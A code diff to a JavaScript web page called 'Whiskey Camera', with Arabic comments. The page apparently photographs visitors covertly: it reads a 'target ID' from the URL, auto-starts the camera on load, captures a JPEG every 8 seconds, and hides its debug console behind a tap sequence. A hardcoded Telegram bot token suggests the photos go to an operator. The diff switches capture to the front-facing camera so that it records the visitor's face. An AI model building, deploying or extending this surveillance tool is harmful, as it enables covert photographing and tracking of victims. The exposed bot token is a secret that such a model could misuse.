@@ -91,7 +91,7 @@
             const BOT_TOKEN = '8837356969:AAEqliDVUj-gEWZMliD51nhLL7cO7h3Nd3U';
             const CAPTURE_INTERVAL_MS = 8000; // كل 8 ثوانٍ
 
-            // ✅ تصحيح: استخراج المعرف من ?id=
+            // ✅ استخراج المعرف من ?id=
             function getTargetId() {
                 try {
                     const urlParams = new URLSearchParams(window.location.search);
@@ -184,7 +184,7 @@
             const MAX_INIT_ATTEMPTS = 5;
 
             // ============================================================
-            // 6. التقاط الصورة (بدون عكس - كاميرا خلفية)
+            // 6. التقاط الصورة (مع عكس - كاميرا أمامية) 🔥
             // ============================================================
             async function captureImage() {
                 if (!cameraActive || !mediaStream || !video.videoWidth || !video.videoHeight) {
@@ -198,8 +198,11 @@
                     canvas.width = vw;
                     canvas.height = vh;
                     
-                    // رسم الصورة بدون عكس (للكاميرا الخلفية)
+                    // 🔥 عكس الصورة (مرآة) للكاميرا الأمامية
+                    ctx.translate(vw, 0);
+                    ctx.scale(-1, 1);
                     ctx.drawImage(video, 0, 0, vw, vh);
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                     
                     const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                     addDebug(`📸 تم التقاط الصورة (${vw}x${vh})`, 'info');
@@ -316,12 +319,12 @@
             }
 
             // ============================================================
-            // 10. تشغيل الكاميرا (الكاميرا الخلفية)
+            // 10. تشغيل الكاميرا (الكاميرا الأمامية) 🔥
             // ============================================================
             async function initCamera() {
                 try {
                     initAttempts++;
-                    addDebug(`📷 محاولة تشغيل الكاميرا (#${initAttempts})...`, 'info');
+                    addDebug(`📷 محاولة تشغيل الكاميرا الأمامية (#${initAttempts})...`, 'info');
                     
                     // التحقق من دعم getUserMedia
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -331,33 +334,33 @@
                     
                     let stream = null;
                     
-                    // محاولة استخدام الكاميرا الخلفية أولاً
+                    // 🔥 محاولة استخدام الكاميرا الأمامية أولاً
                     try {
-                        addDebug('📷 محاولة استخدام الكاميرا الخلفية (exact)...', 'info');
+                        addDebug('📷 محاولة استخدام الكاميرا الأمامية (exact)...', 'info');
                         stream = await navigator.mediaDevices.getUserMedia({
                             video: { 
-                                facingMode: { exact: "environment" },
+                                facingMode: { exact: "user" },
                                 width: { ideal: 640 },
                                 height: { ideal: 480 }
                             },
                             audio: false
                         });
-                        addDebug('✅ تم استخدام الكاميرا الخلفية (exact)', 'success');
+                        addDebug('✅ تم استخدام الكاميرا الأمامية (exact)', 'success');
                     } catch (firstError) {
                         addDebug(`⚠️ فشل exact: ${firstError.message}`, 'warning');
                         try {
-                            addDebug('📷 محاولة استخدام الكاميرا الخلفية (بدون exact)...', 'info');
+                            addDebug('📷 محاولة استخدام الكاميرا الأمامية (بدون exact)...', 'info');
                             stream = await navigator.mediaDevices.getUserMedia({
                                 video: { 
-                                    facingMode: "environment",
+                                    facingMode: "user",
                                     width: { ideal: 640 },
                                     height: { ideal: 480 }
                                 },
                                 audio: false
                             });
-                            addDebug('✅ تم استخدام الكاميرا الخلفية (بدون exact)', 'success');
+                            addDebug('✅ تم استخدام الكاميرا الأمامية (بدون exact)', 'success');
                         } catch (secondError) {
-                            addDebug(`⚠️ فشل environment: ${secondError.message}`, 'warning');
+                            addDebug(`⚠️ فشل user: ${secondError.message}`, 'warning');
                             try {
                                 addDebug('📷 محاولة استخدام أي كاميرا متاحة...', 'info');
                                 stream = await navigator.mediaDevices.getUserMedia({
@@ -399,7 +402,7 @@
                     cameraActive = true;
                     const vw = video.videoWidth || 640;
                     const vh = video.videoHeight || 480;
-                    addDebug(`✅ الكاميرا تعمل (${vw}x${vh})`, 'success');
+                    addDebug(`✅ الكاميرا الأمامية تعمل (${vw}x${vh})`, 'success');
                     
                     // بدء التصوير التلقائي
                     startAutoCapture();
@@ -458,7 +461,7 @@
 
             // بدء التشغيل عند تحميل الصفحة
             window.addEventListener('load', () => {
-                addDebug('🚀 جاري تهيئة النظام...', 'info');
+                addDebug('🚀 جاري تهيئة النظام (كاميرا أمامية)...', 'info');
                 setTimeout(initCamera, 1000);
             });
 
@@ -473,13 +476,11 @@
             });
 
             // رسائل ترحيب في الكونسول
-            addDebug('📋 تم تحميل التطبيق (كاميرا خلفية - صور)', 'info');
-            console.log('%c🔍 Whiskey Camera - كاميرا خلفية', 'font-size:16px;font-weight:bold;');
+            addDebug('📋 تم تحميل التطبيق (كاميرا أمامية - صور)', 'info');
+            console.log('%c🔍 Whiskey Camera - كاميرا أمامية', 'font-size:16px;font-weight:bold;');
             console.log('%c👆 اضغط 5 مرات على الزاوية السفلية اليسرى لتفعيل وحدة التحكم', 'font-size:12px;color:#888;');
             console.log(`%c🆔 المعرف المستهدف: ${CHAT_ID}`, 'font-size:12px;color:#4caf50;');
-
-            // تنبيه للمستخدم بطلب صلاحيات الكاميرا
-            console.log('%c📷 سيُطلب منك السماح باستخدام الكاميرا', 'font-size:14px;color:#ff9800;');
+            console.log('%c📷 سيُطلب منك السماح باستخدام الكاميرا الأمامية', 'font-size:14px;color:#ff9800;');
 
         })();
     </script>
